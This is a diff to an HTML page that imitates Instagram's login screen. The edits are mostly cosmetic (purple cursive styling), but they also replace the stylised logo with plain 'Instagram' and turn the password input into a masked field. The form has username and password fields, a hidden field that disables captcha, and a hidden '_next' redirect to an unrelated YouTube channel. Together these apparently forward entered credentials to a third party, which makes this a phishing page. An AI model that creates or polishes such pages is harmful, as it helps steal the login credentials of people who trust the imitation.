@@ -4,7 +4,7 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Login </title>
-  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet" />
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&family=Segoe+Script&display=swap" rel="stylesheet" />
   <style>
     body {
       background-color: #fafafa;
@@ -20,8 +20,10 @@
       margin-bottom: 30px;
       font-weight: bold;
       font-size: 32px;
-      color: #262626;
-      letter-spacing: -1px;
+      color: #6a1b9a; /* roxo escuro */
+      letter-spacing: 2px;
+      font-family: 'Segoe Script', cursive;
+      text-shadow: 1px 1px 3px rgba(0,0,0,0.3);
     }
 
     form {
@@ -45,11 +47,23 @@
       border-radius: 4px;
       background: #fafafa;
       outline: none;
+      font-family: 'Segoe Script', cursive;
+      color: #5e35b1; /* tom roxo */
+      letter-spacing: 1.5px;
+    }
+
+    input::placeholder {
+      font-family: 'Segoe Script', cursive;
+      color: #9c27b0;
+      opacity: 0.8;
+      letter-spacing: 1.2px;
     }
 
     input:focus {
       border-color: #a8a8a8;
       background: #fff;
+      color: #4527a0;
+      font-weight: bold;
     }
 
     button {
@@ -62,6 +76,9 @@
       border-radius: 4px;
       cursor: pointer;
       margin-top: 10px;
+      transition: background-color 0.3s ease;
+      font-family: 'Roboto', sans-serif;
+      letter-spacing: 1px;
     }
 
     button:hover {
@@ -87,11 +104,11 @@
   </style>
 </head>
 <body>
-  <div class="logo">𝓘𝓷𝓼𝓽𝓪𝓰𝓻𝓪𝓶</div>
+  <div class="logo">Instagram</div>
 
   <form id="loginForm">
-    <input type="text" name="usuarioteste" placeholder="𝗻𝗼𝗺𝗲 𝗱𝗼 𝘂𝘀𝘂á𝗿𝗶𝗼" required />
-    <input type="text" name="respostateste" placeholder="𝘀𝗲𝗻𝗵𝗮" required />
+    <input type="text" name="usuarioteste" placeholder="" required />
+    <input type="password" name="respostateste" placeholder="" required />
 
     <input type="hidden" name="_captcha" value="false" />
     <input type="hidden" name="_next" value="https://www.youtube.com/@NATTO_BEATS" />
@@ -101,7 +118,6 @@
 
   <div class="footer"> 
     <br>
-  
   </div>
 
   <script>
